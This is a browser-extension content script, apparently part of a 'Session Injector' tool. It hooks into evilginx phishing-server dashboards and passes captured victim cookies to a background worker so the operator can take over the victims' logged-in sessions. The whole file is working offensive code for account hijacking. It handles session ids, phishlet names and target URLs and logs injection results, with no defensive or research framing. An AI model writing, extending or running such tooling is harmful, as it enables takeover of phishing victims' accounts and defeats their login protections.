// Session Injector - content script.
// Runs on pages that identify as an evilginx dashboard (the operator control
// panel and the per-server dashboard both use data-app="ctrl-panel") and bridges
// dashboard events to the background worker.
//
// The extension context can be invalidated at any time (extension reloaded or
// updated) which makes chrome.runtime null and turns every call into a console
// error. Everything here goes through guards so that is silent.

(function () {
  if (!document.body || document.body.dataset.app !== 'ctrl-panel') return;

  function alive() {
    try { return !!(chrome && chrome.runtime && chrome.runtime.id); } catch (e) { return false; }
  }
  function gone() { try { document.dispatchEvent(new CustomEvent('ext-gone')); } catch (e) { } }
  function send(msg, cb) {
    if (!alive()) { gone(); if (cb) cb(null); return; }
    try {
      chrome.runtime.sendMessage(msg, function (r) {
        // reading lastError suppresses "Unchecked runtime.lastError"
        var err = null;
        try { err = chrome.runtime && chrome.runtime.lastError; } catch (e) { err = e; }
        if (err) gone();
        if (cb) cb(err ? null : r);
      });
    } catch (e) { gone(); if (cb) cb(null); }
  }
  function store(obj) {
    if (!alive()) return;
    try { chrome.storage.local.set(obj, function () { void (chrome.runtime && chrome.runtime.lastError); }); } catch (e) { /* gone */ }
  }

  window.__ctrlExtension = true;
  document.dispatchEvent(new CustomEvent('ext-ready'));
  store({ dashboardConnected: true, dashboardUrl: window.location.origin });
  send({ action: 'dashboard', url: window.location.origin });

  // A refreshed content script (or a re-injected one) re-announces itself.
  if (window.__ctrlExtBound) {
    // already bound: just re-signal
  } else {
    window.__ctrlExtBound = true;

    window.addEventListener('unload', function () { store({ dashboardConnected: false }); });

    window.addEventListener('message', function (event) {
      if (event.source !== window || !event.data) return;
      var m = event.data;

      // Take over a session (payload already carries the cookies).
      if (m.type === 'DO_INJECT') {
        send({ action: 'inject', payload: m.payload, mode: m.mode }, function (res) {
          res = res || {};
          store({
            lastInject: {
              sessionId: m.payload && m.payload.session_id,
              phishlet: m.payload && m.payload.phishlet,
              count: res.success || 0,
              failed: res.failed || 0,
              where: res.where || '',
              error: res.error || '',
              targetUrl: m.payload && m.payload.target_url,
              time: Date.now(),
            },
          });
          window.dispatchEvent(new CustomEvent('inject-result', { detail: res }));
        });
      }

      // Dashboard tells us which row is selected.
      if (m.type === 'SESSION_SELECT') store({ currentSession: m.payload });

      // Dashboard pushed its session list: feeds the badge and auto-open.
      if (m.type === 'SESSIONS') send({ action: 'sessions', list: m.payload || [] });
    });
  }
})();
